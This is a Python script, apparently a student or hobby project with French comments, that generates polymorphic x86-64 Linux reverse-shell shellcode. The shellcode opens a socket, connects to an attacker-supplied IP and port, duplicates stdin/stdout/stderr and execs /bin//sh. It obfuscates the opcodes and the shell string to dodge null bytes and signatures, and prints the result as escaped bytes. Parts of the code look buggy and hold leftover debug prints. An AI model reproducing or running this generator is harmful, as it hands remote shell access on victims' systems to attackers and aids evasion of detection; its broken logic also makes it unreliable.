#! /usr/bin/python

from random import randint as r
import socket
from sys import argv

#Fonction qui va vérifier que la string reçue ne contient aucune valeur hexa 0x00 ou 0xFF
def verifOffus(binBashHexa):
    #Vérifie s'il y a 0x au debut de la string
    if binBashHexa[0]+binBashHexa[1] != "0x" :
        binBashHexa = "0x"+binBashHexa

    #Parcours la string
    for i in range(2,len(binBashHexa),2):
        #Récupère par tranche de deux caractères une sub string
        sub ="0x"+binBashHexa[i] + binBashHexa[i+1]
        numInHex = int(sub,16)

        #Vérifie qu'il n'y ait ni de 0 ni de valeur à 16
        if numInHex == int("0x00",16) or numInHex == int("0xff",16) :
            return False
    return True


def factorOffus(string4Payload):
    #Vérifie que la string ne contient aucune valeur hexa 0x00 ou 0xFF
    if verifOffus(string4Payload) == False:
        return string4Payload

    #Vérifie s'il n'y a pas "0x" au debut de la string, au quel cas on va l'ajouter
    if string4Payload[0]+string4Payload[1] != "0x" :
        string4Payload = "0x"+string4Payload
    
    #Tableau qui va recevoir les possibilités d'offuscation par addition ou soustraction
    arr = []                #tab temporaire
    theOneArr = []          #tab d'accueil réel

    #On définit l'opérateur (1 == '-' ; 2 == '+')
    ope = r(1,2)
   
    #Evalue les 15 possibilités de soustraction/addition par tranche de 2 octets de la string
    for j in range(1,15):
            
        for i in range(2,len(string4Payload),2): #Commence à 2 pour ignorer "0x" dans la chaine

            #On substring par tranche de 2 octet notre string en hexa
            sub ="0x"+string4Payload[i+1]
            numInHex = int(sub,16)
            
            #Soustraction : l'offuscation se fera donc par soustraction (et la désof par addition)
            if ope == 1 :
                tmp = numInHex - j

                #Si le résultat de la sosutraction est différente de 255 (0xFF) ou 0 (0x00), on ajoute à la liste
                if tmp > 0:
                    arr.append(j)
                else:
                    break

            #Addition : l'offuscation se fera donc par addition (et la désof par soustraction)
            if ope == 2 :
                tmp = numInHex + j

                #Si le résultat de l'addition est différente de 255 (0xFF) ou 0 (0x00), on ajoute à la liste
                if tmp < 255 :
                    arr.append(j)
             
                else:
                    break

    #Rend unique chaque valeurs et les ordonne
    arr[:] = list(set(arr)) 

    #On épure du tableau toutes les valeurs que celle de la string ne peuvent pas supporter en ce servant de arr comme 
    # tableau temporaire
    for i in range(2,len(string4Payload),2):
        sub ="0x"+string4Payload[i]+string4Payload[i+1]
        numInDec = int(sub,16)
        
        for j in range(len(arr)) :
            if ope == 1 :
                if (numInDec - arr[j]) > 0 :
                    theOneArr.append(arr[j])

                else:
                    if arr[j] :
                        while arr[j] in theOneArr:
                            del theOneArr[theOneArr.index(arr[j] )]
            
            if ope == 2 :
                if (numInDec + arr[j]) < 255 :
                    theOneArr.append(arr[j])

                else:
                    if arr[j] :
                        while arr[j] in theOneArr:
                            del theOneArr[theOneArr.index(arr[j] )]

    #Ce tableau setted sera notre tableau de référence pour add ou sub une valeur à chaque double octet de notre string(elle, en hexa)
    theOneArr[:]= list(set(theOneArr))

    rand = r(theOneArr[0],theOneArr[1]) #On choisie aléatoirement parmis les valeurs obtenue une seule valeur

    #Si l'opérateur été "-", on rend positif la valeur choisie aléatoirement
    if ope == 1 :
         rand = rand * -1

    return rand

#Le "main" de l'offuscation, on va utiliser le retour de la fonction factorOffus 
# et l'additionner à toutes les valeurs par tanches de deux octets de la string d'hexa
def offus(string4Payload, rand):
    #On recinstitue une nouvelle chaine en hexa
    newString = ""

    #Vérifie s'il n'y a pas "0x" au debut de la string
    if string4Payload[0]+string4Payload[1] != "0x" :
        string4Payload = "0x"+string4Payload
    
    #On boucle sur l'addition/soustraction avec notre coefficient pour obtenir notre nouvelle string
    for i in range(2,len(string4Payload),2):

        if string4Payload[i] + string4Payload[i+1] == "0x" :
            continue
        
        else :
            #Récupère la valeur hexa pour l'occurence en cours
            sub = string4Payload[i] + string4Payload[i+1]
            #Ajout la valeur random à la valeur (résultat en décimal)
            numInDec = int(sub,16) + rand
            #Convertit en hexa
            numInHex = hex(numInDec)

            #La fonction hex ecrit 2 en hexa => 0x2 et pas 0x02 donc on vérifie
            if len(str(numInHex)) > 3:
                newString = newString + str(numInHex[-2:])
            else :
                newString = newString + "0" + str(numInHex[-1:])
    
    return newString

#Renvoit l'opcode pour soustraire ou additionnner ce qui rend la désoffuscation possible
def deOffus(factorOffusVar, string_to_deof):
    addString = ""
    #On a add donc on va re sub la différence additionnée
    if factorOffusVar < 0 :
        factorOffusVar *= -1 
        if factorOffusVar < 10 :

            halfLen = int((len(string_to_deof)/2))      #On va créer une string avec un seul caractère comme suit. Ex: 0a0a0a0a0a0a0a
            for i in range(halfLen):
                addString+="0"+str(factorOffusVar)      #Le zéro est ajouté ici donc on aura besoin que de la moitié de la longueur de la string (halfLen)

            addString = "4883eb" + addString
            return addString
        
        elif factorOffusVar >= 10 :
            newFactor = ""
            if factorOffusVar == 10 : newFactor = "a"
            elif factorOffusVar == 11 : newFactor = "b"
            elif factorOffusVar == 12 : newFactor = "c"
            elif factorOffusVar == 13 : newFactor = "d"
            elif factorOffusVar == 14 : newFactor = "e"
            elif factorOffusVar == 15 : newFactor = "f"

            halfLen = int((len(string_to_deof)/2))
            for i in range(halfLen):
                addString+="0"+str(newFactor)

            addString = "4883eb" + addString
            return addString
        
    #On a sub donc on va re add la différence soustraite
    elif factorOffusVar > 0 :
        if factorOffusVar <= 10 :
            
            halfLen = int((len(string_to_deof)/2))
            for i in range(halfLen):
                addString+="0"+str(factorOffusVar)

            addString = "4883c3" + addString
            return addString
        
        elif factorOffusVar > 10 :
            newFactor = ""
            if factorOffusVar == 10 : newFactor = "a"
            elif factorOffusVar == 11 : newFactor = "b"
            elif factorOffusVar == 12 : newFactor = "c"
            elif factorOffusVar == 13 : newFactor = "d"
            elif factorOffusVar == 14 : newFactor = "e"
            elif factorOffusVar == 15 : newFactor = "f"

            halfLen = int((len(string_to_deof)/2))
            for i in range(halfLen):
                addString+="0"+str(newFactor)
                #halfLen-=1

            addString = "4883c3" + addString
            return addString



def clean(reg):
    if str(reg) == "rax":
        l = ["4831c0", "4829c0"] # xor rax, rax or sub rax, rax 
        return l[r(0,1)]
    elif str(reg) == "rbx":
        l = ["4831db","4829db"] # xor rax, rax or sub rax, rax 
        return l[r(0,1)]
    elif str(reg) == "rcx":
        l = ["4831c9","4829c9"] # xor rax, rax or sub rax, rax 
        return l[r(0,1)]
    elif str(reg) == "rdx":
        l = ["4831d2","4829d2"] # xor rax, rax or sub rax, rax 
        return l[r(0,1)]
    elif str(reg) == "rsi":
        l = ["4831f6", "48c1ee10"] # xor rax, rax or sub rax, rax 
        return l[r(0,1)]
    elif str(reg) == "rdi":
        l = ["4831ff","48c1ef10"] # xor rax, rax or sub rax, rax 
        return l[r(0,1)]




def create_socket():
    global PAYLOAD
    # syscall
    PAYLOAD += "b029" if r(0,1) else "0429"
    # mov bl, 0x02; mov rdi, rbx le deuxième à add bl, 0x02, mov rdi, rbx inc rdi, inc rdi
    rand = r(0,2)
    if rand == 0:
        PAYLOAD += "b3024889df"
    elif rand == 1:
        PAYLOAD += "80c3024889df"
    elif rand == 2:
        PAYLOAD += "48ffc748ffc7"
    clean("rbx")
    # mov bl, 0x01 mov rsi, rbx add bl, 0x01, mov rsi, rbx inc rsi
    rand = r(0,2)
    if rand == 0:
        PAYLOAD += "b3014889de"
    elif rand == 1:
        PAYLOAD += "80c3014889de"
    elif rand == 2:
        PAYLOAD += "48ffc6"
    PAYLOAD += call()



def socket_connect(ip, port):
   
   global PAYLOAD
   add_string = ""
   l = ["4889c74989fa", "4889c74989C2", "50415a4c89d7", "4989c24889c7"] # mov rdi, rax; mov r10, rax | push rax; pop rdi; mov r10, rdi | push rax; pop r10; mov rdi, r10 | mov r10, rax ; mov rdi, rax
   add_string += l[r(0,len(l)-1)]   
   add_string += clean("rax")
   print('1:', add_string)
   rand = r(0,1)
   #Offuscation du socket
   if rand == 0:
        #Offuscation
        random1 = factorOffus("042a")
        of_string = offus("042a", random1)
        #Inverse en mirroir tout la chaine pour op code
        of_string = of_string[::-1]
        print("2:", of_string)
        PAYLOAD += "48bb"
        PAYLOAD+= of_string
        print("2: ", add_string)
        #Désoffuscation
        deof_string = deOffus(random1, add_string)
        print("1", deof_string, random1, add_string)
        #Inverse en mirroir tout la chaine pour op code
        deof_string = deof_string[::-1]
        print("3:", add_string)
   else :
        #Offuscation
        random1 = factorOffus("b02a")
        of_string = offus("b02a", random1)
        #Inverse en mirroir tout la chaine pour op code
        of_string = of_string[::-1]
        print("2:", of_string)
        PAYLOAD += "48bb"
        PAYLOAD+=of_string
        print("2: ", add_string)
        #Désoffuscation
        deof_string = deOffus(random1, add_string)
        print("1", deof_string, random1, add_string)
        #Inverse en mirroir tout la chaine pour op code
        deof_string = deof_string[::-1]
        print("3:", add_string)

   print("4: ", add_string) 
   print(add_string)
   add_string += deof_string
   print("4.5: ", add_string) 
   add_string += clean("rbx")
   add_string += "53" # push rbx
   ip_greater = []
   ip_to_substract = []
   cmp = 0
   print("5: ", add_string )
   for ip in ip.split("."):
        ip_to_substract.append(r(int(ip)+1, 255))
        ip_greater.append(ip_to_substract[cmp] - int(ip))
        cmp += 1
    
   print("6:", add_string) 
   add_string += "be" # mov esi
   for i in range(0,len(ip_greater)):
       if ip_greater[i] < 17: PAYLOAD += "0"
       PAYLOAD += hex(ip_greater[i])[2:]


   add_string += "83ee" # sub esi
   for i in range(0, len(ip_to_substract)):
        if ip_to_substract[i] < 17: PAYLOAD += "0"
        PAYLOAD += hex(ip_to_substract[i])[2:]

   port = hex(socket.htons(int(port)))
   add_string += "566668" # push
   add_string += str(port[-4:])  
   add_string += "666a02" #AF_INET
   add_string += "4889e6" if r(0,1) else "4831f64801e6" # "mov rsi, rsp" "xor rsi, rsi ; add rsi, rsp"
   add_string += "b218" # mov dl,24
   add_string += call()
   PAYLOAD += add_string
   return PAYLOAD

'''
def deof_socket_connect(ip, port):
    global PAYLOAD
    l = ["4889C74989FA", "4889C74989C2", "50415A4C89D7", "4989C24889C7"] # mov rdi, rax; mov r10, rax | push rax; pop rdi; mov r10, rdi | push rax; pop r10; mov rdi, r10 | mov r10, rax ; mov rdi, rax
    PAYLOAD += l[r(0,len(l)-1)]   
    clean("rax")
    PAYLOAD += "B02A"
    clean("rbx")
    PAYLOAD += "53" # push rbx
    ip_greater = []
    ip_to_substract = []
    cmp = 0
    for ip in ip.split("."):
        ip_to_substract.append(r(int(ip)+1, 255))
        ip_greater.append(ip_to_substract[cmp] - int(ip))
        cmp += 1

    PAYLOAD += "BE" # mov esi
    for i in range(0, len(ip_to_substract)):
        if ip_to_substract[i] < 17: PAYLOAD += "0"
        PAYLOAD += hex(ip_to_substract[i])[:2]

    PAYLOAD += "81EE" # sub esi
    for i in range(0,len(ip_greater)):
        if ip_greater[i] < 17: PAYLOAD += "0"
        PAYLOAD += hex(ip_greater[i])[:2]

    
    port = hex(socket.htons(int(port)))

    PAYLOAD += "566668" # push
    print("PAYLOAD : ", PAYLOAD)
    PAYLOAD += str(port[-4:]) # Le port en little endian    
    PAYLOAD += "666a02" #AF_INET
    PAYLOAD += "4889e6" if r(0,1) else "4831f64801e6" # soit on fait "mov rsi, rsp" soit on fait "xor rsi, rsi ; add rsi, rsp"7
    print("ouou",PAYLOAD)
    PAYLOAD += "b218" # mov dl,24
    PAYLOAD += call()
    return PAYLOAD
'''
def dup2x3():
    global PAYLOAD
    PAYLOAD += clean('rax')
    for i in range(0,3):
        PAYLOAD += "b03f"
        PAYLOAD += "4c89d7"
        if not(i):
            PAYLOAD += clean('rsi')
        else:
            PAYLOAD += '48ffc6' # inc rsi
        PAYLOAD += call()




def shell():
    global PAYLOAD
    #String d'accueil offusquée 
    addString = ""

    #Clean les registres
    PAYLOAD+=clean("rax")
    PAYLOAD+=clean("rdx")

    #Obrient le coefficient d'addition ou soustraction
    factorOffusVar = factorOffus("68732f6e69622f2f")

    #Offusque la string
    offuString = offus("68732f6e69622f2f",factorOffusVar)

    #Inverse en mirroir tout la chaine pour op code
    offuString = offuString[::-1]

    PAYLOAD += "48bb"       #   mov rbx, ...
    PAYLOAD+=offuString     #.../bin/bash format hexa, offusqué
    #Déoffucation
    PAYLOAD += deOffus(factorOffusVar, "0x68732f6e69622f2f") 

    PAYLOAD+="5053"         #   push rax push rbx

    PAYLOAD+="4889e7"       #   mov rdi, rsp
    PAYLOAD+="50"           #   push rax
    PAYLOAD+="57"           #   push rdi
    PAYLOAD+="4889e6"       #   mov rsi, rsp
  
    #Appel systeme
    PAYLOAD+="b03b"         #   mov al, 0x3b
    PAYLOAD+= call()

"""
EXEMPLE EXECUTION OFFUSCATION DESOFFUSCATION :

random1 = factorOffus("0x68732f6e69622f2f") #Marche avec n'importe quelle string en hexa avec 0x ou non
of_string = offus("0x68732f6e69622f2f", random1)
of_string = of_string[::-1] #litle indian
of_string += "48bb"
deof_string = deOffus(random1, of_string)
        
print("FINAL : 0x68732f6e69622f2f", random1, of_string, deof_string)

FIN EXEMPLE
"""


""" C'est quoi cette ... chose ????????????????????????????????????????
def deof_shell():
    global PAYLOAD
    #String d'accueil offusquée 
    addString = ""

    #Clean les registres
    PAYLOAD+=clean("rax")
    PAYLOAD+=clean("rdx")

    #Obrient le coefficient d'addition ou soustraction
    #factorOffusVar = factorOffus("68732f6e69622f2f")

    #Offusque la string
    #offuString = offus("68732f6e69622f2f",factorOffusVar)


    #Inverse en mirroir tout la chaine pour op code
    #offuString = offuString[::-1]

    PAYLOAD += "48bb2f2f62696e"  #mov rbx, ...
    '''
    for i in range(0,15,2):
        sub = offuString[i+1] + offuString[i] 
        PAYLOAD+= sub
    PAYLOAD+=offuString
    '''
                    #.../bin/bash en hexa offusqué    
    
    #Déoffucation
    #PAYLOAD += deOffus(factorOffusVar, "0x68732f6e69622f2f") 
    PAYLOAD+="2f7368"
    PAYLOAD+="4889e7" # mov rdi, rsp
    PAYLOAD+="50" #push rax
    PAYLOAD+="57" #push rdi
    PAYLOAD+="4889e6" #mov rsi, rsp
  
    #Appel systeme
    PAYLOAD+="b03b" #mov al, 0x3b
    PAYLOAD+= call()
"""    
    
def _exit():
    global PAYLOAD
    PAYLOAD+=clean("rax")
    PAYLOAD+=clean("rdx")
    PAYLOAD+="b03c"
    PAYLOAD +='4c89d7'
    PAYLOAD += call()


def call():
    return '0f05'

def shellcodize(PAYLOAD):
    shellcode = 'X'
    shellcode += 'X'.join(a+b for a,b in zip(PAYLOAD[::2], PAYLOAD[1::2]))
    shellcode = shellcode.replace('X', '\\x')
    return(shellcode)

PAYLOAD = ""
PAYLOAD += clean("rax")
PAYLOAD += clean("rbx")
PAYLOAD += clean("rcx")
PAYLOAD += clean("rdx")
PAYLOAD += clean("rdi")
PAYLOAD += clean("rsi")
PAYLOAD += clean("rsi")
create_socket()
socket_connect(argv[1], argv[2])
#deof_socket_connect(argv[1], argv[2])
dup2x3()
shell()
#deof_shell()
_exit()
#print(bit_to_opcode(PAYLOAD))
#print(PAYLOAD)
print(shellcodize(PAYLOAD.lower()))
